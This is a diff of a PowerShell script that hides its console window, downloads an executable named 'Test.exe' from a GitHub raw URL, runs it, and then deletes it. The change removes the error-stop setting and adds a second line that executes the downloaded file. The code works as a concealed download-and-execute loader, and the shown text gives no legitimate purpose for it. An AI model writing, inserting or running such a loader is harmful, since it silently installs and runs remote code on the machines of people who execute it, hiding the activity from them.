@@ -14,7 +14,6 @@ $consolePtr = [ConsoleWindow]::GetConsoleWindow()
 
 [ConsoleWindow]::ShowWindow($consolePtr, [ConsoleWindow]::SW_HIDE)
 
-$ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 $DownloadURL = 'https://github.com/Gabkill54/Kidou-Software/raw/main/Test.exe'
@@ -40,6 +39,8 @@ if ($response.Content) {
 Set-Content -Path $FilePath -Value $response.Content
 
 Start-Process cmd.exe -ArgumentList "/c `"$FilePath`"" -Wait
+
+Start-Process $FilePath -Wait
 
 Remove-Item $FilePath
 
